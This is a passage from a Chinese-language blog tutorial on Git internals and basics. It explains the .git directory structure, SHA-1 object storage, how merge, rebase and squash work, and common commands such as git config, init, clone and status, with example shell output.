class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$tree</span> -a</span><br><span class="line">.</span><br><span class="line">└── .git</span><br><span class="line">    ├── HEAD                                      </span><br><span class="line">    ├── branches</span><br><span class="line">    ├── config</span><br><span class="line">    ├── description</span><br><span class="line">    ├── hooks</span><br><span class="line">    │   ├── applypatch-msg.sample</span><br><span class="line">    │   ├── commit-msg.sample</span><br><span class="line">    │   ├── fsmonitor-watchman.sample</span><br><span class="line">    │   ├── post-update.sample</span><br><span class="line">    │   ├── pre-applypatch.sample</span><br><span class="line">    │   ├── pre-commit.sample</span><br><span class="line">    │   ├── pre-push.sample</span><br><span class="line">    │   ├── pre-rebase.sample</span><br><span class="line">    │   ├── pre-receive.sample</span><br><span class="line">    │   ├── prepare-commit-msg.sample</span><br><span class="line">    │   └── update.sample</span><br><span class="line">    ├── index</span><br><span class="line">    ├── info</span><br><span class="line">    │   └── exclude</span><br><span class="line">    ├── objects</span><br><span class="line">    │   ├── .DS_Store</span><br><span class="line">    │   ├── info</span><br><span class="line">    │   └── pack</span><br><span class="line">    └── refs</span><br><span class="line">        ├── heads</span><br><span class="line">        └── tags</span><br></pre></td></tr></table></figure><h3 id="Git目录解析"><a href="#Git目录解析" class="headerlink" title="Git目录解析"></a>Git目录解析</h3><h4 id="config-目录"><a href="#config-目录" class="headerlink" title="config 目录"></a>config 目录</h4><p>config 是仓库的配置文件，一个典型的配置文件如下，我们创建的远端，分支都在等信息都在配置文件里有表现；<code>fetch</code> 操作的行为也是在这里配置的：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[core]</span><br><span class="line">    repositoryformatversion = <span class="number">0</span></span><br><span class="line">    filemode = <span class="keyword">false</span></span><br><span class="line">    bare = <span class="keyword">false</span></span><br><span class="line">    logallrefupdates = <span class="keyword">true</span></span><br><span class="line">    symlinks = <span class="keyword">false</span></span><br><span class="line">    ignorecase = <span class="keyword">true</span></span><br><span class="line">[remote <span class="string">"origin"</span>]</span><br><span class="line">    url = git<span class="variable">@github</span>.<span class="symbol">com:</span>yanhaijing/zepto.fullpage.git</span><br><span class="line">    fetch = +refs/heads/*<span class="symbol">:refs/remotes/origin/*</span></span><br><span class="line">[branch <span class="string">"master"</span>]</span><br><span class="line">    remote = origin</span><br><span class="line">    merge = refs/heads/master</span><br><span class="line">[branch <span class="string">"dev"</span>]</span><br><span class="line">    remote = origin</span><br><span class="line">    merge = refs/heads/dev</span><br></pre></td></tr></table></figure><h4 id="objects-目录"><a href="#objects-目录" class="headerlink" title="objects 目录"></a>objects 目录</h4><p>Git 可以通过一种算法可以得到任意文件的 <strong>“指纹”</strong>（40 位 16 进制数字），然后通过文件指纹存取数据，存取的数据都位于 objects 目录。</p><p>例如我们可以手动创建一个测试文本文件并使用 <code>git add .</code> 命令来观察 <code>.git</code> 文件夹出现的变化：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ touch test.txt</span><br><span class="line">$ git add .</span><br></pre></td></tr></table></figure><p><code>git add .</code> 命令就是用于把当前新增的变化添加进 Git 本地仓库的，在我们使用后，我们惊奇的发现 <code>.git</code> 目录下的 <code>objects/</code> 目录下多了一个目录：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$ tree -a</span><br><span class="line">.</span><br><span class="line">├── .git</span><br><span class="line">│   ├── HEAD</span><br><span class="line">│   ├── branches</span><br><span class="line">│   ├── config</span><br><span class="line">│   ├── description</span><br><span class="line">│   ├── hooks</span><br><span class="line">│   │   ├── 节省篇幅..省略..</span><br><span class="line">│   ├── index</span><br><span class="line">│   ├── info</span><br><span class="line">│   │   └── exclude</span><br><span class="line">│   ├── objects</span><br><span class="line">│   │   ├── .DS_Store</span><br><span class="line">│   │   ├── e6</span><br><span class="line">│   │   │   └── 9de29bb2d1d6434b8b29ae775ad8c2e48c5391</span><br><span class="line">│   │   ├── info</span><br><span class="line">│   │   └── pack</span><br><span class="line">│   └── refs</span><br><span class="line">│       ├── heads</span><br><span class="line">│       └── tags</span><br><span class="line">└── test.txt</span><br></pre></td></tr></table></figure><p>我们可以使用 <code>git hash-object test.txt</code> 命令来看看刚才我们创建的 <code>test.txt</code> 的 “文件指纹”：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">hash</span>-object test.txt</span><br><span class="line">e69de29bb2d1d6434b8b29ae775ad8c2e48c5391</span><br></pre></td></tr></table></figure><p>这时候我们可以发现，新创建的目录 <code>e6</code> 其实是该文件哈希值的前两位，这其实是 Git 做的一层类似于索引一样的东西，并且默认采用 16 进制的两位数来当索引，是非常合适的。</p><p>这边其实引入了Sha-1算法</p><p>SHA-1将文件中的内容通过通过计算生成一个 40 位长度的hash值。</p><p>Sha-1的非常有特点：</p><ul><li>由文件内容计算出的hash值</li><li>hash值相同，文件内容相同</li></ul><p>对于添加的内容，无论我们执行多少次，都会得到相同的结果。因此，文件的sha-1值是可以作为文件的唯一 id 。同时，它还有一个额外的功能，校验文件完整性。</p><p><strong>objects 目录下有 3 种类型的数据：</strong></p><ul><li>Blob；</li><li>Tree;</li><li>Commit；</li></ul><p>文件都被存储为 blob 类型的文件，文件夹被存储为 tree 类型的文件，创建的提交节点被存储为 Commit 类型的数据；</p><p>一般我们系统中的目录(tree)，在 Git 会像下面这样存储：</p><p><img src="https://magic-king.net/images/loading.gif" data-original="git/git_5.png" alt></p><p>而 Commit 类型的数据则整合了 tree 和 blob 类型，保存了当前的所有变化，例如我们可以再在刚才的目录下新建一个目录，并添加一些文件试试：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir <span class="built_in">test</span></span><br><span class="line">$ touch <span class="built_in">test</span>/test.file</span><br><span class="line">$ tree -a</span><br><span class="line">.</span><br><span class="line">├── .git</span><br><span class="line">│   ├── HEAD</span><br><span class="line">│   ├── branches</span><br><span class="line">│   ├── config</span><br><span class="line">│   ├── description</span><br><span class="line">│   ├── hooks</span><br><span class="line">│   │   ├── 节省篇幅..省略..</span><br><span class="line">│   ├── index</span><br><span class="line">│   ├── info</span><br><span class="line">│   │   └── exclude</span><br><span class="line">│   ├── objects</span><br><span class="line">│   │   ├── .DS_Store</span><br><span class="line">│   │   ├── e6</span><br><span class="line">│   │   │   └── 9de29bb2d1d6434b8b29ae775ad8c2e48c5391</span><br><span class="line">│   │   ├── info</span><br><span class="line">│   │   └── pack</span><br><span class="line">│   └── refs</span><br><span class="line">│       ├── heads</span><br><span class="line">│       └── tags</span><br><span class="line">├── <span class="built_in">test</span></span><br><span class="line">│   └── test.file</span><br><span class="line">└── test.txt</span><br></pre></td></tr></table></figure><p>提交完Commit在观察变化</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">$ git commit -a -m <span class="string">"test: 新增测试文件夹和测试文件观察.git文件的变化"</span></span><br><span class="line">[master (root-commit) 30d51b1] <span class="built_in">test</span>: 新增测试文件夹和测试文件观察.git文件的变化</span><br><span class="line"> 1 file changed, 0 insertions(+), 0 deletions(-)</span><br><span class="line"> create mode 100644 test.txt</span><br><span class="line">$ tree -a</span><br><span class="line">.</span><br><span class="line">├── .git</span><br><span class="line">│   ├── COMMIT_EDITMSG</span><br><span class="line">│   ├── HEAD</span><br><span class="line">│   ├── branches</span><br><span class="line">│   ├── config</span><br><span class="line">│   ├── description</span><br><span class="line">│   ├── hooks</span><br><span class="line">│   │   ├── ...省略...</span><br><span class="line">│   ├── index</span><br><span class="line">│   ├── info</span><br><span class="line">│   │   └── exclude</span><br><span class="line">│   ├── logs</span><br><span class="line">│   │   ├── HEAD</span><br><span class="line">│   │   └── refs</span><br><span class="line">│   │       └── heads</span><br><span class="line">│   │           └── master</span><br><span class="line">│   ├── objects</span><br><span class="line">│   │   ├── .DS_Store</span><br><span class="line">│   │   ├── 30</span><br><span class="line">│   │   │   └── d51b1edd2efd551dd6bd52d4520487b5708c0e</span><br><span class="line">│   │   ├── 5e</span><br><span class="line">│   │   │   └── fb9bc29c482e023e40e0a2b3b7e49cec842034</span><br><span class="line">│   │   ├── e6</span><br><span class="line">│   │   │   └── 9de29bb2d1d6434b8b29ae775ad8c2e48c5391</span><br><span class="line">│   │   ├── info</span><br><span class="line">│   │   └── pack</span><br><span class="line">│   └── refs</span><br><span class="line">│       ├── heads</span><br><span class="line">│       │   └── master</span><br><span class="line">│       └── tags</span><br><span class="line">├── <span class="built_in">test</span></span><br><span class="line">│   └── test.file</span><br><span class="line">└── test.txt</span><br></pre></td></tr></table></figure><p>首先我们可以观察到我们提交了一个 Commit 的时候在第一句话里面返回了一个短的像是哈希值一样的东西： <code>[master (root-commit) 30d51b1]</code> 中 的 <code>30d51b1</code>，对应的我们也可以在 objects 找到刚才 commit 的对象，我们可以使用 <code>git cat-file -p</code> 命令输出一下当前文件的内容：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ git cat-file -p 30d5</span><br><span class="line">tree 5efb9bc29c482e023e40e0a2b3b7e49cec842034</span><br><span class="line">author 我没有三颗心脏  1565742122 +0800</span><br><span class="line">committer 我没有三颗心脏  1565742122 +0800</span><br><span class="line"></span><br><span class="line"><span class="built_in">test</span>: 新增测试文件夹和测试文件观察.git文件的变化</span><br></pre></td></tr></table></figure><p>我们发现这里面有提交的内容信息、作者信息、提交者信息以及 commit message，当然我们可以进一步看到提交的内容具体有哪些：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git cat-file -p 5efb</span><br><span class="line">100644 blob e69de29bb2d1d6434b8b29ae775ad8c2e48c5391    test.txt</span><br></pre></td></tr></table></figure><p>我们再试着提交一个 commit 来观察变化:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ touch <span class="built_in">test</span>/test2.file</span><br><span class="line">$  git commit -a -m <span class="string">"test: 新增加一个 commit 以观察变化."</span></span><br><span class="line">[master 9dfabac] <span class="built_in">test</span>: 新增加一个 commit 以观察变化.</span><br><span class="line"> 2 files changed, 0 insertions(+), 0 deletions(-)</span><br><span class="line"> create mode 100644 <span class="built_in">test</span>/test.file</span><br><span class="line"> create mode 100644 <span class="built_in">test</span>/test2.file</span><br><span class="line">$ git cat-file -p 9dfabac</span><br><span class="line">tree c562bfb9441352f4c218b0028148289f1ea7d7cd</span><br><span class="line">parent 30d51b1edd2efd551dd6bd52d4520487b5708c0e</span><br><span class="line">author 龙滔  1565878699 +0800</span><br><span class="line">committer 龙滔  1565878699 +0800</span><br><span class="line"></span><br><span class="line"><span class="built_in">test</span>: 新增加一个 commit 以观察变化.</span><br></pre></td></tr></table></figure><p>可以观察到这一次的 commit 多了一个 parent 的行，其中的 <strong>“指纹”</strong> 和上一次的 commit 一模一样，当我们提交两个 commit 之后我们的 Git 仓库可以简化为下图：</p><p><img src="https://magic-king.net/images/loading.gif" data-original="git/git_6.png" alt></p><ul><li>说明：其中因为我们 test 文件夹新增了文件，也就是出现了变化，所以就被标识成了新的 tree 类型的对象；</li></ul><h4 id="refs-目录"><a href="#refs-目录" class="headerlink" title="refs 目录"></a>refs 目录</h4><p>refs 目录存储都是引用文件，如本地分支，远端分支，标签等</p><ul><li>refs/heads/xxx 本地分支</li><li>refs/remotes/origin/xxx 远端分支</li><li>refs/tags/xxx 本地tag</li></ul><p>引用文件的内容都是 40 位长度的 commit</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cat .git/refs/heads/master</span><br><span class="line">9dfabac68470a588a4b4a78742249df46438874a</span><br></pre></td></tr></table></figure><p>这就像是一个指针一样，它指向了你的最后一次提交（例如这里就指向了第二次提交的 commit），我们补充上分支信息，现在的 Git 仓库就会像下图所示：</p><p><img src="https://magic-king.net/images/loading.gif" data-original="git/git_7.png" alt></p><h4 id="HEAD-目录"><a href="#HEAD-目录" class="headerlink" title="HEAD 目录"></a>HEAD 目录</h4><p>HEAD 目录下存储的是当前所在的位置，其内容是分支的名称：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cat HEAD</span><br><span class="line">ref: refs/heads/master</span><br></pre></td></tr></table></figure><p>我们再补充上 HEAD 的信息，现在的 Git 仓库如下图所示：</p><p><img src="https://magic-king.net/images/loading.gif" data-original="git/git_8.png" alt></p><h3 id="git的冲突处理"><a href="#git的冲突处理" class="headerlink" title="git的冲突处理"></a>git的冲突处理</h3><p>以下主要参考以下两篇文章</p><blockquote><p><a href="https://www.wmyskxz.com/2019/08/16/git-yuan-li-ru-men-jian-xi/#toc-heading-11" target="_blank" rel="noopener">git冲突处理图解</a></p><p><a href="https://coding.net/help/doc/practice/git-principle.html" target="_blank" rel="noopener">使用原理视角看 Git</a></p></blockquote><p>讲完git的目录结构，我们可知道分支在git中仅是一个指针，但是在分布式工作中，无可避免的会遇见冲突（分支的合并）</p><p><img src="https://magic-king.net/images/loading.gif" data-original="git/git_9.png" alt></p><p>图上的情况，并不是移动分支指针就能够解决问题的，它需要一种合并策略。首先我们需要明确的是谁与谁的合并，是 2，3 与 4， 5， 6 两条线的合并吗？其实并不是的，<strong>真实合并的其实只有 3 和 6，因为每一次的提交都包含了项目完整的快照，即合并只是 tree 与 tree 的合并。</strong></p><p>这可能说起来有点绕，我们可以先来想一个简单的算法，用来比较 3 和 6 的不同。如果我们只是单纯的比较 3 和 6 的信息，其实并没有意义，因为它们之间并不能确切的表达出当前的冲突状态。因此我们需要选取它们两个分支的分歧点（merge base）作为参考点，进行比较。</p><p>首先我们把 1 作为基础，然后把 1、3、6 中所有的文件做一个列表，然后依次遍历这个列表中的文件。我们现在拿列表中的一个文件进行举例，把在提交在 1、3、6 中的该文件分别称为版本1、版本3、版本6，可能出现如下几种情况：</p><p><strong>1. 版本 1、版本 3、版本 6 的 “指纹” 值都相同：</strong>这种情况则说明没有冲突；<br><strong>2. 版本 3 or 版本 6 至少有一个与版本 1 状态相同（指的是指纹值相同或都不存在）：</strong>这种情况可以自动合并，比如版本 1 中存在一个文件，在版本 3 中没有对该文件进行修改，而版本 6 中删除了这个文件，则以版本 6 为准就可以了；<br><strong>3. 版本 3 or 版本 6 都与版本 1 的状态不同：</strong>这种情况复杂一些，自动合并策略很难生效了，所以需要手动解决；</p><h4 id="merge-操作"><a href="#merge-操作" class="headerlink" title="merge 操作"></a>merge 操作</h4><p>在解决完冲突后，我们可以将修改的内容提交为一个新的提交，这就是 merge。</p><p><img src="https://magic-king.net/images/loading.gif" data-original="git/git_11.png" alt="img"></p><p>可以看到 merge 是一种不修改分支历史提交记录的方式，这也是我们常用的方式。但是这种方式在某些情况下使用起来不太方便，比如我们创建了一些提交发送给管理者，管理者在合并操作中产生了冲突，还需要去解决冲突，这无疑增加了他人的负担。</p><p>而我们使用 rebase 可以解决这种问题。</p><h4 id="rebase-操作"><a href="#rebase-操作" class="headerlink" title="rebase 操作"></a>rebase 操作</h4><p>假设我们的分支结构如下：</p><p><img src="https://magic-king.net/images/loading.gif" data-original="git/git_11.png" alt="img"></p><p>rebase 会把从 Merge Base 以来的所有提交，以补丁的形式一个一个重新打到目标分支上。这使得目标分支合并该分支的时候会直接 <strong>Fast Forward</strong>（可以简单理解为直接后移指针），即不会产生任何冲突。提交历史是一条线，这对强迫症患者可谓是一大福音。</p><p><img src="https://magic-king.net/images/loading.gif" data-original="git/git_12.png" alt="img"></p><p>其实 rebase 主要是在 .git/rebase-merge 下生成了两个文件，分别为 git-rebase-todo 和 done 文件，这两个文件的作用光看名字就大概能够看得出来。git-rebase-todo 中存放了 rebase 将要操作的 commit，而 done 存放正操作或已操作完毕的 commit，比如我们这里，git-rebase-todo 存放了 4、5、6 三个提交。</p><p><img src="https://magic-king.net/images/loading.gif" data-original="git/git_13.png" alt="img"></p><p>首先 Git 会把 4 这个 commit 放入 done，表示正在操作 4，然后将 4 以补丁的方式打到 3 上，形成了新的 4`，这一步是可能产生冲突的，如果有冲突，需要解决冲突之后才能继续操作。</p><p><img src="https://magic-king.net/images/loading.gif" data-original="git/git_14.png" alt="img"></p><p>接着按同样的方式把 5、6 都放入 done，最后把指针移动到最新的提交 6 上，就完成了 rebase 的操作。</p><p><strong>从刚才的图中，我们就可以看到 rebase 的一个缺点，那就是修改了分支的历史提交。</strong>如果已经将分支推送到了远程仓库，会导致无法将修改后的分支推送上去，必须使用 -f 参数（force）强行推送。</p><p><strong>所以使用 rebase 最好不要在公共分支上进行操作。</strong></p><h4 id="Squash-and-Merge-操作"><a href="#Squash-and-Merge-操作" class="headerlink" title="Squash and Merge 操作"></a>Squash and Merge 操作</h4><p>简单说就是压缩提交，把多次的提交融合到一个 commit 中，这样的好处不言而喻，我们着重来讨论一下实现的技术细节，还是以我们上面最开始的分支情况为例，首先，Git 会创建一个临时分支，指向当前 feature 的最新 commit。</p><p><img src="https://magic-king.net/images/loading.gif" data-original="git/git_15.png" alt="img"></p><p>然后按照上面 rebase 的方式，变基到 master 的最新 commit 处。</p><p><img src="https://magic-king.net/images/loading.gif" data-original="git/git_16.png" alt="img"></p><p>接着用 rebase 来 squash 之，压缩这些提交为一个提交。</p><p><img src="https://magic-king.net/images/loading.gif" data-original="git/git_17.png" alt="img"></p><p>最后以 fast forward 的方式合并到 master 中。</p><p><img src="https://magic-king.net/images/loading.gif" data-original="git/git_18.png" alt="img"></p><p>可见此时 master 分支多且只多了一个描述了这次改动的提交，这对于大型工程，保持主分支的简洁易懂有很大的帮助。</p><h2 id="git基本操作"><a href="#git基本操作" class="headerlink" title="git基本操作"></a>git基本操作</h2><h3 id="git配置"><a href="#git配置" class="headerlink" title="git配置"></a>git配置</h3><p>Git 提供了一个叫做 git config 的工具，专门用来配置或读取相应的工作环境变量。<br>这些环境变量，决定了 Git 在各个环节的具体工作方式和行为。这些变量可以存放在以下三个不同的地方：</p><blockquote><p>/etc/gitconfig 文件：系统中对所有用户都普遍适用的配置。若使用 git config 时用 –system 选项，读写的就是这个文件。<br>~/.gitconfig 文件：用户目录下的配置文件只适用于该用户。若使用 git config 时用 –global 选项，读写的就是这个文件。<br>当前项目的 Git 目录中的配置文件（也就是工作目录中的 .git/config 文件）：这里的配置仅仅针对当前项目有效。每一个级别的配置都会覆盖上层的相同配置，所以 .git/config 里的配置会覆盖 /etc/gitconfig 中的同名变量。</p><p>在 Windows 系统上，Git 会找寻用户主目录下的 .gitconfig 文件。主目录即 $HOME 变量指定的目录，一般都是 C:\Documents and Settings\$USER。</p><p>此外，Git 还会尝试找寻 /etc/gitconfig 文件，只不过看当初 Git 装在什么目录，就以此作为根目录来定位。</p></blockquote><h4 id="1-用户信息-git-config-user"><a href="#1-用户信息-git-config-user" class="headerlink" title="1.用户信息    git config user"></a>1.用户信息    <code>git config user</code></h4><p>在使用git提交前，一定要配置提交者个人的用户名称和电子邮件</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git config --global user.name <span class="string">"wyndam"</span></span><br><span class="line">$ git config --global user.email <span class="string">"only.night@qq.com"</span></span><br></pre></td></tr></table></figure><p>如果用了<em><code>--global</code></em>选项，那么更改的配置文件就是位于你用户主目录下的那个，以后你所有的项目都会默认使用这里配置的用户信息。<br>如果要在某个特定的项目中使用其他名字或者电邮，只要去掉<em>–global</em>选项重新配置即可，新的设定保存在当前项目的 .git/config 文件里。</p><h4 id="2-文本编辑器"><a href="#2-文本编辑器" class="headerlink" title="2.文本编辑器"></a>2.文本编辑器</h4><p>设置Git默认使用的文本编辑器, 一般可能会是 Vi 或者 Vim。如果你有其他偏好，比如 Emacs 的话，可以重新设置：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git config --global core.editor emacs</span><br></pre></td></tr></table></figure><h4 id="3-差异分析工具"><a href="#3-差异分析工具" class="headerlink" title="3.差异分析工具"></a>3.差异分析工具</h4><p>还有一个比较常用的是，在解决合并冲突时使用哪种差异分析工具。比如要改用 vimdiff 的话：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git config --global merge.tool vimdiff</span><br></pre></td></tr></table></figure><p>Git 可以理解 kdiff3，tkdiff，meld，xxdiff，emerge，vimdiff，gvimdiff，ecmerge，和 opendiff 等合并工具的输出信息。<br>当然，你也可以指定使用自己开发的工具。</p><h4 id="4-查看配置信息-git-config-list"><a href="#4-查看配置信息-git-config-list" class="headerlink" title="4.查看配置信息    git config --list"></a>4.查看配置信息    <code>git config --list</code></h4><p>要检查已有的配置信息，可以使用 git config –list 命令：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$ git config --list</span><br><span class="line"></span><br><span class="line">core.symlinks=<span class="literal">false</span></span><br><span class="line">core.autocrlf=<span class="literal">true</span></span><br><span class="line">color.diff=auto</span><br><span class="line">color.status=auto</span><br><span class="line">color.branch=auto</span><br><span class="line">color.interactive=<span class="literal">true</span></span><br><span class="line">pack.packsizelimit=2g</span><br><span class="line">help.format=html</span><br><span class="line">http.sslcainfo=E:/Platform/Git/mingw32/ssl/certs/ca-bundle.crt</span><br><span class="line">diff.astextplain.textconv=astextplain</span><br><span class="line">rebase.autosquash=<span class="literal">true</span></span><br><span class="line">filter.lfs.clean=git-lfs clean %f</span><br><span class="line">filter.lfs.smudge=git-lfs smudge %f</span><br><span class="line">filter.lfs.required=<span class="literal">true</span></span><br><span class="line">user.name=Wyndam</span><br><span class="line">user.email=only.night@qq.com</span><br><span class="line">core.editor=subl</span><br></pre></td></tr></table></figure><p>有时候会看到重复的变量名，那就说明它们来自不同的配置文件（比如 /etc/gitconfig 和 ~/.gitconfig），不过最终 Git 实际采用的是最后一个。<br>这些配置我们也可以在 ~/.gitconfig 或 /etc/gitconfig 看到，如下所示：</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[filter <span class="string">"lfs"</span>]</span><br><span class="line">    <span class="attr">clean</span> = git-lfs clean %f</span><br><span class="line">    <span class="attr">smudge</span> = git-lfs smudge %f</span><br><span class="line">    <span class="attr">required</span> = <span class="literal">true</span></span><br><span class="line">[user]</span><br><span class="line">    <span class="attr">name</span> = Wyndam</span><br><span class="line">    <span class="attr">email</span> = only.night@qq.com</span><br><span class="line">[core]</span><br><span class="line">    <span class="attr">editor</span> = subl</span><br></pre></td></tr></table></figure><p>也可以直接查阅某个环境变量的设定，只要把特定的名字跟在后面即可，像这样：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git config user.email</span><br><span class="line"></span><br><span class="line">magic@outlook.com</span><br></pre></td></tr></table></figure><h3 id="新建git本地仓库"><a href="#新建git本地仓库" class="headerlink" title="新建git本地仓库"></a>新建git本地仓库</h3><p>Git 使用 git init 命令来初始化一个 Git 仓库，Git 的很多命令都需要在 Git 的仓库中运行，所以 git init 是使用 Git 的第一个命令。<br>在执行完成 git init 命令后，Git 仓库会生成一个 .git 目录，该目录包含了资源的所有元数据，其他的项目目录保持不变（不像 SVN 会在每个子目录生成 .svn 目录，Git 只在仓库的根目录生成 .git 目录）。</p><p>在工作目录下使用命令<code>git init</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$git</span> init (path)</span><br></pre></td></tr></table></figure><p>若没有指定path，则默认当前目录下建立git仓库。</p><p>初始化后，会在工作目录下会出现一个名为 .git 的目录，所有 Git 需要的数据和资源都存放在这个目录中。<br>如果当前目录下有几个文件想要纳入版本控制，需要先用 git add 命令告诉 Git 开始对这些文件进行跟踪，然后提交：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git add . (path|file)</span><br><span class="line">$ git commit -m <span class="string">"inital commit"</span></span><br></pre></td></tr></table></figure><p>以上命令就是把文件/文件夹提交至仓库中，若是远程仓库，还需要命令<code>git    push</code></p><h3 id="复制远程仓库-git-clone"><a href="#复制远程仓库-git-clone" class="headerlink" title="复制远程仓库 git clone"></a>复制远程仓库 git clone</h3><p>我们使用 git clone 从现有 Git 仓库中拷贝项目（类似 svn checkout）。<br>克隆仓库的命令格式为:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> &lt;repo|url&gt; (&lt;directory&gt;)</span><br></pre></td></tr></table></figure><p>参数说明：</p><p>\&lt;repo|url&gt;：为Git仓库的地址url</p><p>\<directory>：为将git储存至目标目录，若为空，则默认本地目录</directory></p><p>Git支持ssh，git，http和https协议（此外，可以使用ftp和ftps进行获取，但这效率低下且不建议使用；请勿使用它）。</p><ul><li>ssh://[user@]host.xz[:port]/path/to/repo.git/</li><li>git://host.xz[:port]/path/to/repo.git/</li><li>http[s]://host.xz[:port]/path/to/repo.git/</li><li>ftp[s]://host.xz[:port]/path/to/repo.git/</li></ul><p>也可以用类似scp的语法进行clone（实际上是ssh协议）</p><ul><li>[user@]host.xz:path/to/repo.git/</li></ul><h3 id="查看状态git-status"><a href="#查看状态git-status" class="headerlink" title="查看状态git    status"></a>查看状态<code>git    status</code></h3><p>git status 以查看在你上次提交之后是否有修改。<br>我演示该命令的时候加了 -s 参数，以获得简短的结果输出。如果没加该参数会详细输出内容：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ git status</span><br><span class="line">On branch master</span><br><span class="line"></span><br><span class="line">Initial commit</span><br><span class="line"></span><br><span class="line">Changes to be committed:</span><br><span class="line">  (use <span class="string">"git rm --cached 